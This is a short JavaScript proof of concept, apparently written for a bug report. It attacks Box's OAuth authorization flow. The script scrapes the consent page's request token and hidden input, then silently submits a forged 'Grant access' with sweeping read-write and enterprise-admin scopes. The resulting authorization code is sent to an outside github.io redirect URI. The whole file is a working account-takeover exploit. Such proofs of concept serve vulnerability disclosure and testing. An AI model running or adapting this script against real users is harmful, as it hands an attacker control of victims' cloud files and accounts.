var url = "https://app.box.com/api/oauth2/authorize?client_id=1vewmllcy3lwa4y7b3yjft4xn6g9k8qf&response_type=code"

var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get',url,true);
req.send();

var req2 = new XMLHttpRequest();
req2.onload = popalert();

function reqListener() {
req_token = this.responseText.split("request_token = '")[1].split("';</script>")[0];
var parser = new DOMParser();
var htmlDoc = parser.parseFromString(this.responseText, 'text/html');
var ic_val = htmlDoc.getElementsByTagName("input")[10].value;
makepostreq(ic_val,req_token);
}; 

function makepostreq(ic_val,req_token){

	var body = "client_id=1vewmllcy3lwa4y7b3yjft4xn6g9k8qf&response_type=code&redirect_uri=https%3A%2F%2Fninetyn1ne.github.io%2Ftest&scope=root_readonly+root_readwrite+manage_groups+manage_webhook+manage_enterprise_properties+manage_data_retention+item_execute_integration+manage_app_users+manage_managed_users&folder_id=&file_id=&parent_token=&parent_service_id=&service_action_id=&doconsent=doconsent&ic="+ic_val+"&consent_accept=Grant+access+to+Box&request_token="+req_token;

	var form_url = "https://app.box.com/api/oauth2/authorize?client_id=1vewmllcy3lwa4y7b3yjft4xn6g9k8qf&response_type=code";
	req2.open('POST',form_url,true);
	req2.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
	req2.send(body);

}

function popalert(){
	alert("Kindly check you networks tab/burp history for the OAuth code.")
}
